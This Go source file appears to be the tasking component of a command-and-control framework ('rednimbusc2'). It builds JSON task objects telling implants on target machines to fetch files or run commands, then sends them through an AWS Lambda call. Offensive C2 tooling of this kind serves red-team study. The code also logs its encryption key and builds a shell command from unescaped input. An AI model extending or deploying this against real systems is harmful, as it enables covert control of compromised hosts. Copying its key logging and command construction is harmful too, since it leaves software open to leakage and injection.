package tasker

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"strings"

	"github.com/bluesentinelsec/rednimbusc2/pkg/awsProfileHandler"
	"github.com/bluesentinelsec/rednimbusc2/pkg/shellexec"
	"github.com/google/uuid"
	"github.com/jedib0t/go-pretty/v6/table"
	log "github.com/sirupsen/logrus"
)

// TaskObject is used to give
// target implants instructions,
// such as downloading a file,
// running a command, or terminating the
// C2 session.
type TaskObject struct {
	// taskID uniquely identifies the task.
	// This is generated automatically for
	// every new task.
	TaskID string `json:"taskID"`

	// sessionID specifies the exact implant session
	// that should receive and execute the task.
	SessionID string `json:"sessionID"`

	// LambdaHandler determines which Lambda C2 function/
	// processes the task request
	LambdaHandler string `json:"lambdaHandler"`

	// groupName is a label for implant sessions;
	// sessions with the matching group name will
	// receive and execute the task.
	GroupName string `json:"groupName"`

	// execTime specifies the time at which
	// an implant session should execute the task.
	// The time should be in ISO 8601 format, for
	// example: 2018-12-10T13:45:00.000Z.
	ExecTime string `json:"execTime"`

	// Task specifies a supported task to run.
	// For a list of supported tasks, see <TBD>.
	Task string `json:"task"`

	// Arguments holds settings needed for
	// different taskings. For example,
	// the 'get-file' task requires an
	// argument indicating which file to
	// retrieve.
	Arguments []string `json:"arguments"`
}

type LambdaResponse struct {
	ReturnType string `json:"returnType"`
	Length     int    `json:"length"`
	Value      []byte `json:"value"`
}

// used for encrypting/decrypting tasks and output
var secretKey string

//var lambdaPayloadFile *os.File

// NewTask generates a new task object
// with a unique task ID. This function
// should be called before calling SetLambdaTask()
// or UpdateLambdaTask().
func NewTask() *TaskObject {
	taskObj := TaskObject{}
	taskObj.createTaskID() // generate a UUID to uniquely identify the task
	return &taskObj
}

// InvokeLambdaFunction invokes the Nimbus C2
// lambda function, passing it the task object
// in JSON format
func InvokeLambdaFunction(taskObj *TaskObject) (string, error) {
	// read environment variable and encrypt
	// task plus arguments if needed
	log.Debug(secretKey)

	// convert the task object to JSON for use by Lambda
	taskJSON := convertToJSON(taskObj)

	// write task JSON to disk as temporary file
	fileWritten := writeLambdaPayload(taskJSON)

	// cleanup task file when finished
	//defer os.Remove(fileWritten)

	// invoke an AWS CLI command, passing the task file
	// as a payload to set task lambda
	outFile := os.TempDir() + "output.json"
	cmd := fmt.Sprintf("aws lambda --profile %v invoke --function-name nimbusC2Handler --invocation-type RequestResponse --no-paginate --payload file://%v --output json --cli-binary-format raw-in-base64-out %v", awsProfileHandler.GetAWSProfile(), fileWritten, outFile)
	err := shellexec.ExecShellCmd(cmd)
	if err != nil {
		return "", err
	}

	return outFile, err
}

//-----------------------------------
// TaskObject setters and getters.
// Use these functions to get/set
// the TaskObject member variables.
//-----------------------------------

func (taskObj *TaskObject) createTaskID() {
	taskObj.TaskID = uuid.NewString()
}

func (taskObj *TaskObject) GetTaskID() string {
	return taskObj.TaskID
}

func (taskObj *TaskObject) SetTaskID(id string) {
	log.Debug("setting task id as: ", id)
	taskObj.TaskID = id
}

func (taskObj *TaskObject) SetSessionID(id string) {
	taskObj.SessionID = id
}

func (taskObj *TaskObject) GetSessionID() string {
	return taskObj.SessionID
}

func (taskObj *TaskObject) SetGroupName(group string) {
	taskObj.GroupName = group
}
func (taskObj *TaskObject) GetGroupName() string {
	return taskObj.GroupName
}

func (taskObj *TaskObject) SetExecTime(timeISO8601 string) {
	taskObj.ExecTime = timeISO8601
}

func (taskObj *TaskObject) GetExecTime() string {
	return taskObj.ExecTime
}

func (taskObj *TaskObject) SetAgentTask(task string) {
	taskObj.Task = task
}

func (taskObj *TaskObject) GetImplantTask() string {
	return taskObj.Task
}

func (taskObj *TaskObject) SetArguments(arguments string) {
	argList := strings.Split(arguments, ",")
	taskObj.Arguments = append(taskObj.Arguments, argList...)
}

func (taskObj *TaskObject) GetArguments() []string {
	return taskObj.Arguments
}

func (taskObj *TaskObject) SetLambdaHandler(handler string) {
	taskObj.LambdaHandler = handler
}

func (taskObj *TaskObject) GetLambdaHandler() string {
	return taskObj.LambdaHandler
}

func (taskObj *TaskObject) SetKeyEnv(envVarName string) {
	secretKey = os.Getenv(envVarName)
}

func writeLambdaPayload(payloadJSON []byte) string {

	log.Debug("tasker.writeLambdaPayload")

	// create a temporary file
	localTmp := os.TempDir()
	lambdaPayloadFile, err := ioutil.TempFile(localTmp, "nimbusC2")
	if err != nil {
		log.Fatal("tasker.writeLambdaPayload ", err)
	}

	log.Debug("writing Lambda payload file to: ", lambdaPayloadFile.Name())

	// write lambda payload JSON to temp file
	_, err = lambdaPayloadFile.Write(payloadJSON)
	if err != nil {
		log.Fatal("tasker.writeLambdaPayload ", err)
	}

	// caller will delete the temp file when finished
	return lambdaPayloadFile.Name()
}

func convertToJSON(task *TaskObject) []byte {

	log.Debug("tasker.convertToJSON")
	taskJSON, err := json.Marshal(task)
	if err != nil {
		log.Fatal("tasker.convertToJSON ", err)
	}

	return taskJSON
}

// PrintLambdaResponse displays/decodes
// the Lambda function response
func PrintLambdaResponse(filename string) {

	log.Debug("reading Lambda response file: ", filename)

	// read the file containing Lambda output
	rawOutput, err := ioutil.ReadFile(filename)
	if err != nil {
		log.Fatal(err)
	}

	// decode the Lambda file output into struct
	formattedOutput := LambdaResponse{}
	err = json.Unmarshal(rawOutput, &formattedOutput)
	if err != nil {
		log.Fatal(err)
	}

	// clean up Lambda output.value
	trimmedSpace := strings.TrimSpace(string(formattedOutput.Value))
	trimedQuotes := strings.Trim(trimmedSpace, "\"")

	// decode Lambda output.value into a struct
	decodedTaskObj := TaskObject{}
	err = json.Unmarshal([]byte(trimedQuotes), &decodedTaskObj)
	if err != nil {
		log.Fatal(err)
	}

	// display Lambda output as table
	// ToDo - handle encrypted tasks
	t := table.NewWriter()
	t.SetOutputMirror(os.Stdout)
	t.AppendHeader(table.Row{"Type", "Value"})
	t.AppendRow(table.Row{"Task ID:", decodedTaskObj.TaskID})
	t.AppendSeparator()
	t.AppendRow(table.Row{"Session ID:", decodedTaskObj.SessionID})
	t.AppendSeparator()
	t.AppendRow(table.Row{"Group:", decodedTaskObj.GroupName})
	t.AppendSeparator()
	t.AppendRow(table.Row{"Exec Time:", decodedTaskObj.ExecTime})
	t.AppendSeparator()
	t.AppendRow(table.Row{"Task:", decodedTaskObj.Task})
	t.AppendSeparator()
	t.AppendRow(table.Row{"Arguments:", decodedTaskObj.Arguments})
	t.AppendSeparator()
	t.Render()
}
